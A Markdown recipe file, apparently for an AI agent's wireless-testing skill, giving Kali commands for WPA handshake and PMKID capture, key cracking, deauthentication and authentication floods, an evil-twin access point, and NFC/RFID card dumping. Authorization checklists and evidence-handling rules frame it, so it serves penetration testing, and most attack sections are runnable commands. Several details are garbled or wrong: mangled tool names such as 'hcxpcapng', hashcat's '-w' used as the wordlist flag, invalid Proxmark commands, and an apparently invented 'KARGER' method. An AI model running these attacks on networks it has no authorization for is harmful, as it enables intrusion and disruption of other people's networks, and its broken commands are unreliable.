# Wireless and radio recipes

Command-level detail for the `wireless-and-radio` skill. Every recipe is
written for Kali Linux with the aircrack-ng suite, and the manual recipes
assume the written authorization described in `SKILL.md`.

Throughout:

- `wlan0` is the client's adapter, `wlan0mon` is the instrument.
- `AA:BB:CC:DD:EE:FF` is the authorized access point (the BSSID).
- `11:22:33:44:55:66` is a client station associated with it.
- Captures go to `/tmp/cyberpi-captures` and are moved into the
  engagement directory before the session ends.

`wlan0` and `wlan0mon` are placeholders. Read the real interface names
from `iw dev` before running anything.

---

## R0. Adapter inventory and monitor-mode bring-up

### Inventory

```bash
iw dev
airmon-ng
ls -l /sys/class/net
```

`iw dev` lists one `Interface` block per radio. Note the `type` (`managed`,
`monitor`, `AP`), the `channel`, and the `addr` (the hardware MAC).

`airmon-ng` adds the chipset and driver, which is the column that decides
whether injection is possible. A chipset that shows an unsupported driver
will not enter monitor mode at all.

### Bring the interface up

```bash
sudo systemctl stop NetworkManager
sudo nmcli radio wifi off
sudo rfkill unblock wlan
sudo airmon-ng start wlan0
iw dev wlan0mon info
```

`iw dev wlan0mon info` must report `type monitor`. If it still says
`managed`, something re-set it - usually NetworkManager restarting.

### Clear the interferers

```bash
sudo airmon-ng check
```

Typical output names `NetworkManager`, `wpa_supplicant` and
`avahi-daemon`. Stop them:

```bash
sudo systemctl stop NetworkManager
sudo systemctl stop avahi-daemon
sudo systemctl stop bluetooth     # only if Bluetooth is not under test
```

NetworkManager is the usual culprit and it respawns. `sudo systemctl
disable NetworkManager` for the duration of the session if it keeps coming
back, and re-enable it afterwards.

### Regulatory domain

```bash
iw reg get
sudo iw reg set US        # the client's actual country
iw list | grep -A 12 'Supported interface frequencies'
```

Without the correct domain the card may not show 5 GHz channels, may cap
transmit power, and may refuse to transmit at all on some channels. The
domain is a legal statement, not a preference.

### Channel and power

```bash
sudo iw dev wlan0mon set channel 6
sudo iw dev wlan0mon set txpower fixed 20
iw dev wlan0mon link
```

### Injection test

```bash
sudo aireplay-ng --test wlan0mon
```

`Injection is working!` is the expected result. This test transmits a
broadcast probe request, so it is a transmission - it does not disrupt
anything, but it is on the air.

A failure means the driver or chipset does not support injection. Inject
attacks are then not possible with this card; use a different instrument.

### Hardware notes

| Chipset | Typical adapter | Monitor | Inject | Note |
|---|---|---|---|---|
| Atheros AR9271 | ALFA AWUS036NHA | yes | yes | The default choice |
| Atheros AR9287 | ALFA AWUS036NH | yes | yes | 2.4 GHz only |
| Atheros AR7010/AR7210 | ALFA AWUS036ACH | yes | yes | 2.4/5 GHz |
| Ralink RT3070 | Various | yes | yes | 2.4 GHz only |
| Realtek RTL8812AU | Various | with a driver | partly | Driver dependent |
| Broadcom BCM4331 | Laptop | no | no | Internal, keep as the client |
| Intel AX200 | Laptop | yes | no | Internal, keep as the client |

---

## R1. Survey and network inventory

### Interactive survey

```bash
sudo airodump-ng wlan0mon
```

The table shows BSSID, ESSID, channel, cipher, power, beacons, and the
number of associated stations. `Ctrl+C` quits and writes the capture
files.

### Recorded survey

```bash
sudo mkdir -p /tmp/cyberpi-captures
sudo airodump-ng --output-format netxml \
    -w /tmp/cyberpi-captures/site-survey wlan0mon
```

Produces `site-survey-01.cap`, `site-survey-01.netxml`, `.csv` and `.log`.
The netxml is the machine-readable form.

### Filtered survey

```bash
# Only the authorized network
sudo airodump-ng -b AA:BB:CC:DD:EE:FF -c 6 \
    --output-format netxml -w /tmp/cyberpi-captures/acme-hq wlan0mon

# Only one SSID
sudo airodump-ng -N "Acme-Corp" \
    --output-format netxml -w /tmp/cyberpi-captures/acme-corp wlan0mon

# 5 GHz band only
sudo airodump-ng --band a \
    --output-format netxml -w /tmp/cyberpi-captures/site-5g wlan0mon

# 2.4 GHz band only
sudo airodump-ng --band bg \
    --output-format netxml -w /tmp/cyberpi-captures/site-24 wlan0mon
```

### Through the harness

`cyber_wireless_scan` wraps `airodump-ng` for both the survey and the
capture. Read its schema for the exact parameter names, and give it the
target BSSID and channel so it records that network instead of a
promiscuous sweep. Its output lands in `.cyberpi/artifacts/`.

### Inventory to work from

Record one row per network, and mark which ones the client confirmed:

| BSSID | ESSID | Channel | Band | Cipher | Power | Stations | Client-owned |
|---|---|---|---|---|---|---|---|
| AA:BB:CC:DD:EE:FF | Acme-Corp | 6 | 2.4 | WPA2 | -42 | 12 | yes |
| 11:22:33:44:55:77 | Acme-Corp | 149 | 5 | WPA2 | -61 | 4 | yes |
| 22:33:44:55:66:88 | (hidden) | 11 | 2.4 | WEP | -78 | 0 | no |
| 33:44:55:66:77:99 | CafeGuest | 3 | 2.4 | OPN | -55 | 8 | no |

The last two rows are observations, not targets. They are not tested.

---

## R2. Handshake capture

### Preconditions

- Monitor mode confirmed (`iw dev wlan0mon info`).
- Channel pinned to the target's channel.
- Target BSSID known.
- The client station MAC known, for a targeted deauthentication.

### Start the capture

```bash
sudo airodump-ng -c 6 -b AA:BB:CC:DD:EE:FF \
    --output-format netxml \
    -w /tmp/cyberpi-captures/acme-hq wlan0mon
```

Leave it running. The header shows `WPA handshake captured` once the four
EAPOL messages have been seen.

### Force a reassociation

The client must send a message 2 (authentication) and message 3
(association) while the capture is running.

Least intrusive, in order:

1. **Wait.** A client reassociates on its own - a DHCP renew, a roam
   between APs, a laptop waking from sleep. Give it time.
2. **Ask the client.** A user re-joining the SSID, or toggling WiFi, is
   the cleanest method and needs no transmission at all.
3. **Force it.** One targeted deauthentication:
   ```bash
   sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
   ```
   Five frames to one client. The client reconnects immediately, and the
   handshake lands in the capture.

### Through the harness

`cyber_wireless_scan` with the target BSSID and channel selected performs
the same capture. It is the journalled path - prefer it when the capture
is a normal part of the assessment, and keep the manual form for the
cases the tool does not cover (a long unattended capture, a PMKID probe,
an active test).

### How to tell a failed capture from a failed card

| Symptom | Likely cause |
|---|---|
| `No packets received` in the airodump header | Wrong channel, or the card is not in monitor mode |
| Header shows the network, but no handshake | The client never reassociated - wait, ask, or force it |
| Handshake captured but aircrack finds no key | The wordlist does not contain the password, or it is not a PSK network (WPA2-Enterprise) |
| Capture is empty but other networks appear | Channel mismatch between the target and the adapter |
| Interface disappears after `aireplay-ng` | The driver crashed - see R10 |

### Verifying the capture

```bash
# EAPOL frames present
sudo tshark -r /tmp/cyberpi-captures/acme-hq-01.cap \
    -Y 'eapol' -T fields -e wlan.bssid -e wlan.sa -e eapol.version

# Count them - a handshake is four messages
sudo tshark -r /tmp/cyberpi-captures/acme-hq-01.cap -Y 'eapol' | wc -l
```

Four EAPOL frames between the AP and the client is a complete handshake.

---

## R3. PMKID capture

PMKID is derived from the authentication exchange, so it can be collected
from the access point alone, without any client and without disconnecting
anyone.

```bash
sudo hcxpcapng -i wlan0mon -o /tmp/cyberpi-captures/acme.pmkid.hcxpng
```

`hcxpcapng` sends authentication requests to every access point it hears.
That is a transmission, so it stays inside the authorized scope. It does
not deauthenticate clients, so it does not disrupt the site.

Wait for the client to associate at least once before the PMKID is
offered - the AP answers with a PMKID only after it has seen the client.

```bash
sudo hxpmhashtool /tmp/cyberpi-captures/acme.pmkid.hcxpng    # inspect
```

`hxpmhashtool` from `hcxtools` shows what was collected. The file is
`.hcxpng`; aircrack-ng 1.6+ and hashcat 6.2+ read it directly.

If the client has not accepted authentication probes to unknown
networks, take the PMKID out of a capture you already have instead. That
transmits nothing at all:

```bash
hcxpcapng -i /tmp/cyberpi-captures/acme-hq-01.cap -o /tmp/acme.pmkid.hcxpng
```

PMKID is worth trying on every authorized network: it is quieter than a
handshake capture and often cracks faster.

---

## R4. Key recovery

### Build the wordlist

```bash
# Kali's stock list
ls -l /usr/share/wordlists/rockyou.txt
zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt   # if compressed

# Targeted candidates from the engagement
cat > /tmp/targeted.txt <<'EOF'
Acme-Corp
AcmeCorp
Acme2025
acme2025!
Acme-WAP
Acme-WiFi
Acme1234
changeme
Welcome1
EOF
cat /tmp/rockyou.txt /tmp/targeted.txt > /tmp/combined.txt
```

Targeted lists should be built from the client's own naming: the
organization name, the AP model, the ESSID, the site name, the year. A
SSID often is the password.

### Aircrack-ng

```bash
sudo aircrack-ng -w /tmp/combined.txt /tmp/cyberpi-captures/acme-hq-01.cap
```

Useful flags:

| Flag | Effect |
|---|---|
| `-w <file>` | Wordlist |
| `-a <bssid>` | Target one access point in a multi-network capture |
| `-e <essid>` | Target one network by name |
| `-r <file>` | Ignore previous failed attempts (resume a long run) |

Aircrack-ng detects the capture format (EAPOL, PMKID, WEP) on its own.

### Hashcat

```bash
# hcxtools: convert the capture
hcxpcapng -i /tmp/cyberpi-captures/acme-hq-01.cap -o /tmp/acme.hcxpng

# hashcat >= 6.2 reads the .hcxpng / .pcapng formats with mode 22000
hashcat -m 22000 /tmp/acme.hcxpng -w /tmp/combined.txt

# older builds work on the .cap directly with mode 2500
hashcat -m 2500 /tmp/cyberpi-captures/acme-hq-01.cap -w /tmp/combined.txt
```

Confirm the mode the installed build supports:

```bash
hashcat --help | grep -i -E '22000|2500'
```

For a PMKID-only file the same modes apply.

### Through the harness

`cyber_wireless_crack` wraps `aircrack-ng`. Give it the capture path and
the wordlist. The result belongs in the artifact and in a finding; the
key itself is credential material and does not go into the transcript.

### Interpreting the result

| Result | Meaning |
|---|---|
| Key found | The shared PSK is known to anyone who reads the report. Credential compromise. |
| No key found with a strong wordlist | Not proof of strength - the password may be outside the wordlist, and a single uncracked target says nothing about the others. |
| `Not a WPA handshake` / `Invalid packet` | Wrong file format, or the capture holds no EAPOL. Check with `tshark -Y eapol`. |
| `Network not found` | The capture is from a different network than the one addressed with `-a`/`-e`. |
| `0 potential keys` | The capture holds no usable handshake - the EAPOL messages are missing or the file is not a capture aircrack-ng can read. |

---

## R5. Deauthentication and evil twin

**Authorization checklist before any of this runs:**

- [ ] The written authorization names the ESSID **and** the BSSID.
- [ ] The physical location (building, floor) is named.
- [ ] The time window is inside the authorization.
- [ ] The client has been told that a short disruption will occur.
- [ ] The BSSID was re-verified minutes ago (BSSIDs get reused; a client
      radio that was replaced can now answer to a different BSSID).
- [ ] The rule set is minimal: a handful of frames, one client, one
      network.

### Deauthentication

```bash
# Targeted, minimal
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast to every client of one AP (still one network)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

`-0 0` runs forever. Only run it when the client explicitly asked for a
denial-of-service test and has agreed to the outage window.

Other `aireplay-ng` modes, all of which transmit:

| Mode | Command | Purpose |
|---|---|---|
| Authentication flood | `aireplay-ng -1 0 -a <BSSID> wlan0mon` | Endless authentication requests against one AP (`0` means endless) |
| ARP replay | `aireplay-ng -3 -b 00:00:00:00:00:00 -h <host> wlan0mon` | Traffic injection; needs a valid handshake |
| Chopchop (WEP) | `aireplay-ng -4 -b <BSSID> wlan0mon` | Keystream slicing |
| Fragmentation (WEP) | `aireplay-ng -5 -b <BSSID> wlan0mon` | Keystream injection |

### What to observe and report

- Did the client disconnect? (Expect yes with WPA2-PSK.)
- How long until it rejoined?
- Was there a visible error on the client device?
- Did the AP log a deauth reason code? A reason code of 7 ("class 3
  frame received from nonassociated STA") or a burst of reason 1
  ("unspecified") in the AP log is the classic signature.

Report the resilience of the environment, not just the success of the
attack. A network where 5 frames disconnect a device for 30 seconds, with
no user-visible warning, is the finding.

### Evil twin

A soft AP with the client's SSID. Clients that are not validating the
network identity reassociate to it and send their credentials over the
air, in the clear relative to the rogue.

```bash
cat > /tmp/hostapd.conf <<'EOF'
driver=nl80211
interface=wlan0mon
ssid=Acme-Corp
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=change-me-before-use
ieee80211n=1
EOF

sudo hostapd /tmp/hostapd.conf
```

`airbase-ng` (aircrack-ng suite) creates the same soft AP in software;
check `airbase-ng --help` for the installed flag set.

To make a client reassociate, pair it with a deauthentication from the
real AP. That is the disruptive part, and it is why the client must have
agreed to the test in advance.

### Hardening that defeats the test

| Feature | Effect | How to detect |
|---|---|---|
| 802.11w (Protected Management Frames, PMF) | Deauthentication frames are dropped; a rogue cannot force a roam | A deauth that produces no disconnect is PMF in action |
| 802.11r (Fast BSS Transition) | Roaming is authenticated; a rogue is rejected | The client reassociates to the real AP and refuses the twin |
| Nonce/PN validation, key management per client | The rogue never receives a valid MIC | The client shows a "network security key mismatch" style failure |
| 802.1X (WPA2-Enterprise) with a server certificate | The client validates the server; a twin without a trusted certificate is refused | The client asks for credentials again instead of connecting |

### Client-side probing (KARMA / KARGER style)

The complementary question is whether a client *would* associate with a
probe. Assess it in a lab with the organization's own devices and their
own AP, not on the site. A client-side probe that succeeds means the
client's station-association policy is permissive; report it as a
configuration weakness, and do not present it as a device compromise.

---

## R6. Rogue AP detection

### The BSSID-mismatch method

The core of the KARGER approach: the address that advertises the network
and the address that serves the traffic must be the same radio.

```bash
# 1. Beacon frames: what is advertised, and who sends them
sudo tshark -i wlan0mon -f "type mgt subtype beacon" \
    -Y 'wlan.bssid == "AA:BB:CC:DD:EE:FF"' \
    -T fields -e wlan.bssid -e wlan.sa -e wlan.ssid

# 2. The detector: data frames that claim the BSSID but come from
#    a different radio. An empty result is the clean result.
sudo tshark -i wlan0mon \
    -Y 'wlan.fc.type_subtype == 0x08 && wlan.bssid == "AA:BB:CC:DD:EE:FF" && wlan.sa != "AA:BB:CC:DD:EE:FF"' \
    -T fields -e wlan.sa -e wlan.bssid -e wlan.da

# 3. Every transmitter that serves frames for this network
sudo tshark -i wlan0mon \
    -Y 'wlan.fc.type_subtype == 0x08 && wlan.bssid == "AA:BB:CC:DD:EE:FF"' \
    -T fields -e wlan.sa | sort -u

# 4. Probe responses, which some APs use instead of beacons
sudo tshark -i wlan0mon -f "type mgt subtype probe-resp" \
    -Y 'wlan.bssid == "AA:BB:CC:DD:EE:FF"' \
    -T fields -e wlan.bssid -e wlan.sa -e wlan.ssid
```

`wlan.sa` is the transmitter address (TA) of the frame, `wlan.da` is the
receiver, and `wlan.bssid` is the BSSID the frame belongs to. A
legitimate AP has one address in all three roles.

Interpretation:

| Observation | Meaning |
|---|---|
| Command 2 prints nothing | Normal - one radio advertises and serves the network |
| Command 2 prints a different `wlan.sa` | The network is served by a different radio than the one advertising it - the classic rogue or relay condition |
| Command 3 lists one address | Normal |
| Command 3 lists several addresses | Several radios are serving the same BSSID - relay, extender, or a rogue |
| Beacon BSSID present, no data frames | The AP stopped serving clients but still beacons - a "carved" AP |
| Probe response BSSID differs from beacon BSSID | The AP is answering probes from another address |
| Two BSSIDs with the same ESSID and different OUIs | A shadow or a competitor's hardware, or a duplicated configuration |

### Other rogue indicators

```bash
# Every BSSID seen on the site, with the vendor prefix resolved
sudo tshark -i wlan0mon -f "type mgt" \
    -T fields -e wlan.bssid -e wlan.ssid -e wlan.sa | sort -u

# WPS: the vendor element carries the model name and the config methods
sudo tshark -i wlan0mon -f "type mgt subtype beacon" \
    -Y 'wlan.bssid == "AA:BB:CC:DD:EE:FF" && wps.config_methods' \
    -T fields -e wlan.bssid -e wlan.ssid -e wps.model_name -e wps.config_methods

# OUI lookup for a suspicious BSSID
curl -s "https://api.macvendors.com/AA:BB:CC:DD:EE:FF"
```

A MAC address whose vendor is a consumer router, a phone hotspot, or a
"WiFi extender" in a corporate site is a strong indicator. An OUI that
does not resolve at all is also worth a look (locally administered
addresses, for example, are used by randomization - which is itself a
finding for a managed network).

### Checklist

- [ ] Survey recorded every BSSID, ESSID, channel, cipher and vendor.
- [ ] Client confirmed which of them are theirs.
- [ ] The confirmed networks were checked for beacon/data BSSID mismatch.
- [ ] Hidden SSIDs were probed by BSSID.
- [ ] The client's expected channel plan was compared against reality.
- [ ] Findings distinguish "an AP the client does not own" from "a client
      device that associates promiscuously".

---

## R7. Bluetooth and BLE

### Bring the stack up

```bash
sudo systemctl start bluetooth
bluetoothctl power on
bluetoothctl show
```

### Discover devices

```bash
# LE and classic, 30 seconds
bluetoothctl --timeout 30 scan on
bluetoothctl devices

# Classic inquiry (transmits)
sudo hcitool scan

# LE discovery (transmits advertising scans)
sudo btmgmt find

# Controller capabilities
sudo btmgmt info
```

### Inspect a device

```bash
bluetoothctl info AA:BB:CC:DD:EE:FF
hcitool info AA:BB:CC:DD:EE:FF
```

`bluetoothctl info` reports the name, the alias, the UUIDs of the exposed
services, the RSSI, and whether the device is paired and connected.

### Capture the HCI traffic

```bash
sudo btmon -w /tmp/cyberpi-captures/bt.btsnoop
```

`btmon` is interactive: `r` resets the capture, `Ctrl+C` stops it. The
saved file is a btsnoop trace, readable with Wireshark or `btmon`'s own
decoder.

### Assess

| Check | How | Finding |
|---|---|---|
| Device discoverable | `bluetoothctl info` - "Discoverable: yes" | An exposed device that accepts connections |
| Bondable without confirmation | `btmgmt config`, `bluetoothctl info` | Pairing with no user check - enables simple pair attacks |
| Services exposed | UUID list in `bluetoothctl info` | RFCOMM SPP, OBEX, HID, and vendor services are the interesting ones |
| Version disclosure | `hcitool info` | Helps version-pin the vulnerable Bluetooth stacks |
| BLE advertising payload | `btmon` / `bleak` | Asset identifiers and beacon UUIDs leak internal naming |

### BLE with Python

Kali ships `python3-bleak`:

```bash
python3 - <<'EOF'
import asyncio
from bleak import BleakScanner

async def main():
    devices = await BleakScanner.discover(timeout=10.0, return_adv=True)
    for device, data in devices:
        print(f"{device.address}  name={device.name!r}  rssi={data.rssi}")
        print(f"    service_data={data.service_data}")
        print(f"    manufacturer_data={data.manufacturer_data}")

asyncio.run(main())
EOF
```

This is a passive scan: it only listens for advertising packets, and what it
returns is metadata - addresses, names, service data and manufacturer
data - not traffic.

### Bluetooth attack surface

- BlueBorne and its descendants affect unpatched Android, Linux, Windows
  and iOS Bluetooth stacks over **Classic**, and need no pairing. Assess
  the organization's own device patch levels; do not test strangers'
  phones.
- KNOB downgrades the entropy of the encryption key, weakening an already
  negotiated session. It needs a role-switch; assess firmware support
  rather than attempting it on a device that is not the client's.
- KNOB-adjacent and BLURtooth-style attacks need an already established
  or forced pairing.
- Bluejacking-style abuse sends unsolicited content over an OBEX link -
  it needs the target to have a vulnerable service open.
- Sweep-based attacks (BlueBorne) transmit. Inside the client's own lab
  and against the client's own devices only.

---

## R8. NFC, RFID and the other radios

### NFC

```bash
sudo nfc-list -u                 # passive poll, needs an nfc-utils reader
sudo nfc-mfclassic -o /tmp/cyberpi-captures/tag.dump   # MIFARE Classic read
```

Requires a PN532-compatible reader (`libnfc`). Card dumps are credential
material: keep them in the engagement artifact directory, describe the
card type and access bits in the finding, and never print the dump.

### RFID

```bash
pm3                       # Proxmark3 client
pm3> hw detect
pm3> hf search
pm3> hf mf info
pm3> hf mf dump
```

The Proxmark3 can also *write*. Writing to a card is destructive to the
original tag and unauthorized; the assessment stops at reading.

Assessments worth running: card type and technology, whether the access
bits allow a write, whether the UID is static (cloneable) or random,
whether the cryptographic sector is default-keyed, and whether badge
systems use a weak sector-0 default key.

### Zigbee

```bash
# A CC2531 sniffer presents itself as a network interface (usb0, wlan1 ...)
# and the capture is 802.15.4, not WiFi
ip link
sudo tcpdump -i usb0 -w /tmp/cyberpi-captures/zigbee.pcap
```

Decode the capture with the Zigbee dissector in Wireshark (`zbee` filter
and the `Zigbee` protocol preference).

Useful assessment: what the mesh contains, whether the coordinator is
joined with a default or well-known network key, and whether devices
rejoin with a shared key. Default Zigbee network keys and the
`ZigBeeAlliance09` key are a classic finding.

### 433 MHz, LoRa and sub-GHz

```bash
# RFCat (Raspberry Pi Zero W + CC1101)
rfcat -r
```

Assessments: whether the alarm, doorbell, weather sensor or paging
system uses a rolling code, whether the code space is small enough to
brute-force, and whether the payload leaks device identifiers.

### Car key fobs

```bash
pm3> hf 125   # read a 125 kHz fob
pm3> hf 433
```

Assessments: rolling-code presence, whether a static code is used, and
whether the relay attack surface is present (a car that accepts a
retransmitted code). Report the key management weakness - do not clone
and operate a vehicle.

---

## R9. Evidence handling, capture hygiene and cleanup

### What may enter the transcript

- The BSSID, ESSID, channel, cipher and power of each network.
- Counts: how many networks, how many handshakes, how many keys recovered.
- The artifact path of every piece of evidence.
- A statement that a key was recovered - never the key.

### What must not

- PSKs, pre-shared keys, WEP keys, pairing keys.
- Card dumps, badge numbers, MIFARE keys.
- Captured traffic payloads from other people's networks.
- Session cookies or tokens from a captured portal.

### Capture hygiene

```bash
# Keep captures out of the working tree
sudo mkdir -p /tmp/cyberpi-captures
sudo chmod 700 /tmp/cyberpi-captures

# Move the evidence into the engagement, with restrictive permissions
sudo cp /tmp/cyberpi-captures/acme-hq-01.cap .cyberpi/artifacts/acme-hq.cap
sudo chown "$USER" .cyberpi/artifacts/acme-hq.cap
sudo chmod 600 .cyberpi/artifacts/acme-hq.cap

# Clean up off-target material
sudo rm -f /tmp/cyberpi-captures/*.cap
```

Captures contain every frame in range, including other networks' traffic
and other people's devices. Treat them as sensitive evidence: restrict the
permissions, keep them inside the engagement directory, and delete the
copies that are not evidence.

### At the end of the session

```bash
# Stop the capture
sudo pkill -f airodump-ng

# Remove the monitor interface
sudo airmon-ng stop wlan0mon

# Restore the stack
sudo systemctl start NetworkManager
sudo nmcli radio wifi on
sudo iw reg set 00
```

### The record

- Every tool run is journalled automatically.
- Manual steps are not. Write them down: the date, the time, the exact
  command, the adapter, the channel, and the outcome. `cyber_journal`
  shows what was recorded; the engagement notes are where the manual
  steps go.
- Each result becomes a finding with `cyber_record_finding`: the
  evidence is the artifact path.

---

## R10. Troubleshooting

### Monitor mode will not start

| Cause | Fix |
|---|---|
| NetworkManager holds the interface | `sudo systemctl stop NetworkManager` |
| Wrong adapter | `iw dev` - the internal card may not support monitor mode |
| Driver missing | `sudo apt install linux-headers-$(uname -r)` then reinstall the driver |
| `airmon-ng start` says "monitor mode failed" | `sudo dmesg | tail -20` - usually `firmware not loaded` or a missing driver |
| Interface renamed | After `airmon-ng start wlan0` the new name may be `wlan1`; read `iw dev` again |

### Injection does not work

- Chipset does not support it - check the chipset against the table in R0.
- `aireplay-ng --test` says "no packets received" - the adapter is not in
  monitor mode, or the channel is wrong.
- The card is in a different regulatory domain - `iw reg set` and check
  `iw list`.
- A second virtual interface is fighting the first - `iw dev` should show
  one interface.

### No handshake captured

- The client never reassociated - wait longer, ask the client, or force
  it.
- The channel drifted - re-pin with `iw dev wlan0mon set channel N` and
  check that `iw dev wlan0mon info` shows that channel.
- The capture file is the wrong one - `airodump-ng` appends `-01`, `-02`;
  check which file holds the handshake.
- WPA2-Enterprise - there is no PSK to capture, the handshake carries
  credentials protected by the server certificate. Crack attempts fail by
  design.

### The interface disappears

- Driver crash after `aireplay-ng`: `dmesg | tail -30`, reload the
  module with `sudo modprobe -r <driver> && sudo modprobe <driver>`.
- USB autosuspend dropping the dongle: turn it off for the dongle's
  device node -
  `echo on | sudo tee /sys/bus/usb/devices/<bus>-<port>:<port>.<dev>/power/control` -
  or move the adapter to a powered hub.
- A USB 3.0 port dropping the 2.4 GHz dongle - try a USB 2.0 port.

### The capture is full of noise

- The adapter is on the wrong band - 2.4 GHz and 5 GHz are separate
  channels; `airodump-ng --band a` for 5 GHz, `--band bg` for 2.4 GHz.
- Another adapter in monitor mode is nearby - check for other processes
  with `sudo airmon-ng check`.
- The site is dense - reduce the scope to the authorized BSSID with
  `-b`.

### 5 GHz specifics

- Many 2.4 GHz-only adapters cannot see 5 GHz at all. `iw list` shows the
  supported bands.
- 5 GHz channels are DFS-gated: a radar detection makes the card vacate
  the channel for several minutes, and the capture loses the handshake.
  Prefer 36-48 or 149-165 (where allowed) over 52-144.
- The regulatory domain controls which 5 GHz channels are available.
- A DFS channel is a plausible explanation for a capture that stopped
  mid-session.

### Power and range

- `iw dev wlan0mon set txpower fixed 20` - legal in most domains, higher
  where allowed.
- `iw dev wlan0mon set txpower off` - turns the radio's transmitter off
  for a passive capture, so the monitor card cannot be mistaken for a
  client. This is a good habit during a long passive capture.
- The client's own adapter is the limiting factor for a client-side test,
  not the monitor card.

### Encryption and hashing

```bash
# WPA handshake -> hcx for hashcat
hcxpcapng -i capture.cap -o capture.hcxpng
hashcat -m 22000 capture.hcxpng -w wordlist.txt

# PMKID only
hashcat -m 22000 pmkid.hcxpng -w wordlist.txt
```
